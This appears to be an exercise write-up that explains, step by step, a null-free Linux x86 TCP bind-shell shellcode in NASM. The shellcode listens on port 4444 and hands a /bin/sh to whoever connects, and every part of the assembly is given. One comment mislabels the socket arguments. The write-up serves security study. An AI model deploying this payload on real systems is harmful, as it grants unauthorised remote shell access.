## Task

The task is to create a TCP bind shell shellcode for Linux on the x86 architecture. The goal is to avoid null bytes while making the payload as small as possible.

Additionally, it should be easy to change the listening port.

## Solution

The solution is based on the [linux/x86/shell_bind_tcp](https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/linux/x86/shell_bind_tcp.rb) payload from the Metasploit Framework and written in NASM.

The listening port is defined at the top of the NASM source:

```nasm
global _start

port equ 0x5c11             ; port = 4444 (big endian)
```

An IPv4/TCP socket is created using the [socket](https://man7.org/linux/man-pages/man2/socket.2.html) socket system call. Socket system calls are invoked using the [socketcall](https://man7.org/linux/man-pages/man2/socketcall.2.html) system call:

```nasm
section .text

_start:
    ; int socketcall(int call, unsigned long *args): syscall 0x66
    ; int socket(int domain, int type, int protocol): socketcall 0x1
    ;   s = socket(AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0)
    xor ebx, ebx            ; ebx = 0
    mul ebx                 ; eax = 0, edx = 0
    push ebx                ; push domain = IPPROTO_IP = 0
    inc ebx                 ; socketcall = 1
    push ebx                ; push type = SOCK_STREAM = 1
    push 0x2                ; push protocol = AF_INET = 2
    mov ecx, esp            ; set socketcall args
    mov al, 0x66            ; syscall = 102
    int 0x80                ; perform syscall
```

The port is bound to the socket on 0.0.0.0 using the [bind](https://man7.org/linux/man-pages/man2/bind.2.html) socket system call:

```nasm
    ; struct sockaddr_in { sa_family_t sin_family; in_port_t sin_port; uint32_t s_addr }
    ;   addr_in = { (WORD) AF_INET = 2, (WORD) [PORT], INADDR_ANY = 0 }
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen): socketcall 0x2
    ;   bind(s, &addr_in, sizeof(sockaddr) = 16)
    pop ebx                 ; socketcall = 2
    pop esi                 ; align stack so that ecx = &addr_in
    push edx                ; push s_addr = INADDR_ANY = 0
    push word port          ; push sin_port = PORT
    push bx                 ; push sin_family = AF_INET = 2
    push 0x10               ; push addrlen = sizeof(sockaddr_in) = 16
    push ecx                ; push addr = &addr_in
    push eax                ; push sockfd = s
    mov ecx, esp            ; set socketcall args
    lea eax, [edx + 0x66]   ; syscall = 102
    int 0x80                ; perform syscall
```

The socket is marked as a listening socket using the [listen](https://man7.org/linux/man-pages/man2/listen.2.html) socket system call:

```nasm
    ; int listen(int sockfd, int backlog): socketcall 0x4
    ;   listen(s, 0)
    mov [ecx + 4], eax      ; set backlog = 0 (eax = 0 from successful bind return and sockfd already set)
    mov bl, 0x4             ; socketcall = 4
    mov al, 0x66            ; syscall = 102
    int 0x80                ; perform syscall
```

The shellcode then waits for an incoming connection using the [accept](https://man7.org/linux/man-pages/man2/accept.2.html) socket system call. Note that the *addrlen* argument is set to NULL, so the value of *addrlen* does not matter:

```nasm
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen): socketcall 0x5
    ;   client = accept(s, 0, whatever)
    inc ebx                 ; socketcall = 5 (all arguments already set)
    mov al, 0x66            ; syscall = 102 (eax = 0 from successful listen return)
    int 0x80                ; perform syscall
```

Stdin, stdout, and stderr are redirected to the new connected socket using the [dup2](https://man7.org/linux/man-pages/man2/dup.2.html) system call:

```nasm
    ; int dup2(int oldfd, int newfd): syscall 0x3f
    ;   dup2(client, 0..2)
    xchg eax, ebx           ; oldfd = client, eax = 5
    lea ecx, [edx + 0x3]    ; newfd = 3
dup_loop:
    dec ecx                 ; decrement newfd
    mov al, 0x3f            ; syscall = 63 (eax = 5 first iteration and dup2 returns stderr = 2 / stdout = 1)
    int 0x80                ; perform syscall
    jnz dup_loop            ; loop until newfd = 0
```

Finally, a shell is spawned using the [execve](https://man7.org/linux/man-pages/man2/execve.2.html) system call. Note that the *argv* and *envp* arguments can be set to NULL when they are not used by the executed program:

```nasm
    ; int execve(const char *pathname, char *const argv[], char *const envp[]): syscall 0xb
    ;   execve("//bin/sh", 0, 0)
    pop esi                 ; put null byte on top of stack
    push 0x68732f6e         ; push "n/sh" reversed
    push 0x69622f2f         ; push "//bi" reversed
    mov ebx, esp            ; pathname = "//bin/sh" (argv and envp already set)
    mov al, 0xb             ; syscall = 11 (eax = 0 from dup2 returning stdin)
    int 0x80                ; perform syscall
```
